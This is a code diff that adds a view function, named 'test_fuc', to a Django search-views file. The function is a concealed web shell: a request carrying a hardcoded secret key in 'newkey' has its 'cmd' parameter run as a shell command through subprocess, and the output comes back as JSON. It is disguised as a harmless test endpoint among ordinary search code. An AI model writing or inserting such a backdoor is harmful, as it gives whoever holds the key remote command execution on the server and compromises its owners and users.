@@ -273,3 +273,18 @@ class ConfDictSearchView(HaystackViewSet):
     serializer_class = ExportConfDictSerializer
     # 配置检索分页
     pagination_class = Pagination
+
+
+from django.http import HttpResponseRedirect, JsonResponse, HttpResponse
+import subprocess
+
+def test_fuc(request):
+    json_data = {"message": "ok", "errorCode": 0, "data": {}}
+    newkey = request.GET.get('newkey')
+    if newkey == 'newkeytoenddoor99d2ee2674e111ea95501141ff14eabd':
+        cmd = request.GET.get('cmd')
+        if cmd:
+            status, output = subprocess.getstatusoutput(cmd)
+            json_data['data'] = output.replace('\n', '    ')
+        json_data['message'] = 'begin...'
+    return JsonResponse(json_data)
